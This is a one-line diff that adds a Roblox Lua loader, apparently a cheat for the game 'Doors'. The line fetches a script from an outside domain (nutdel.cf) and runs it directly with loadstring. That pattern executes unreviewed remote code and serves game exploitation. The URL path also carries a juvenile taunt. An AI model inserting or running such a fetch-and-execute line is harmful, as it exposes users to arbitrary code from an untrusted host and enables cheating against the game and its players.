@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://nutdel.cf/panel/robloxdoorsscript/penguin/is/gay/GetCrucifix.lua'))()
